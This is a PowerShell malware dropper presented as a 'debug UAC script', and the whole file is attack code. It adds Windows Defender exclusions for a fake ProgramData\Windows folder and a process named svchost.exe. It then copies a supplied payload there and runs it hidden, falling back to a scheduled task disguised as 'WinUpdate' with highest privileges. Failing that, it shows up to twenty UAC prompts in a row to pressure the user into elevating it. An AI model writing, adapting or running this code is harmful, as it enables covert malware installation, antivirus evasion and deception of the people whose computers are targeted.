# Debug UAC Script - Logs everything
param(
    [string]$PayloadPath,
    [string]$ProcessName = "svchost.exe"
)

$LogFile = "$env:TEMP\uac-debug.log"

function Log($msg) {
    $timestamp = Get-Date -Format "HH:mm:ss"
    "$timestamp - $msg" | Out-File $LogFile -Append
}

Log "=== UAC Script Started ==="
Log "PayloadPath: $PayloadPath"
Log "ProcessName: $ProcessName"
Log "Payload Exists: $(Test-Path $PayloadPath)"

# Create exclusion folder
$ExclusionFolder = "$env:ProgramData\Windows"
Log "Creating folder: $ExclusionFolder"
if (!(Test-Path $ExclusionFolder)) {
    New-Item -ItemType Directory -Path $ExclusionFolder -Force | Out-Null
    Log "Folder created"
} else {
    Log "Folder already exists"
}

$PermanentPath = "$ExclusionFolder\$ProcessName"
Log "Target path: $PermanentPath"

# Check if already admin
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Log "Is Admin: $isAdmin"

if ($isAdmin) {
    Log "Running as admin - trying direct method"
    try {
        Add-MpPreference -ExclusionPath $ExclusionFolder -EA 0
        Log "Added folder exclusion"
        Add-MpPreference -ExclusionProcess $ProcessName -EA 0
        Log "Added process exclusion"
        Copy-Item $PayloadPath $PermanentPath -Force
        Log "Copied payload"
        Start-Process $PermanentPath -WindowStyle Hidden
        Log "Started payload"
        exit 0
    } catch {
        Log "Direct method failed: $_"
    }
}

# Check UAC level
$UACLevel = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -EA 0).ConsentPromptBehaviorAdmin
Log "UAC Level: $UACLevel"

if ($UACLevel -eq 0 -or $null -eq $UACLevel) {
    Log "UAC disabled - trying fallback methods"
    
    # Method 1: Task Scheduler
    Log "Trying Task Scheduler method"
    try {
        $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c copy `"$PayloadPath`" `"$PermanentPath`" /Y & start /B `"$PermanentPath`""
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        $task = Register-ScheduledTask -TaskName "WinUpdate" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force -EA Stop
        Log "Task created: $($task.TaskName)"
        Start-Sleep -Seconds 5
        Unregister-ScheduledTask -TaskName "WinUpdate" -Confirm:$false -EA 0
        Log "Task executed and removed"
        
        if (Test-Path $PermanentPath) {
            Log "Task method SUCCESS!"
            exit 0
        } else {
            Log "Task method - file not found"
        }
    } catch {
        Log "Task Scheduler failed: $_"
    }
    
    # Method 2: Direct copy (no elevation)
    Log "Trying direct copy method"
    try {
        Copy-Item $PayloadPath $PermanentPath -Force -EA Stop
        Log "Direct copy SUCCESS"
        Start-Process $PermanentPath -WindowStyle Hidden -EA 0
        Log "Started payload"
        exit 0
    } catch {
        Log "Direct copy failed: $_"
    }
    
    exit 0
}

# UAC enabled - show prompts
Log "UAC enabled - starting UAC loop"
1..20 | ForEach-Object {
    Log "UAC attempt $_"
    try {
        $BatchFile = "$env:TEMP\elevate.bat"
        $BatchContent = "@echo off`r`ncopy `"$PayloadPath`" `"$PermanentPath`" /Y`r`nstart /B `"$PermanentPath`"`r`nexit 0"
        [IO.File]::WriteAllText($BatchFile, $BatchContent)
        Log "Created batch file"
        
        $process = Start-Process $BatchFile -Verb RunAs -PassThru -Wait -ErrorAction Stop
        Log "UAC prompt shown, exit code: $($process.ExitCode)"
        
        Start-Sleep -Seconds 1
        if (Test-Path $PermanentPath) {
            Log "UAC method SUCCESS!"
            break
        }
    }
    catch {
        Log "UAC attempt $_ failed: $_"
    }
    
    Start-Sleep -Seconds 3
}

Log "=== UAC Script Finished ==="

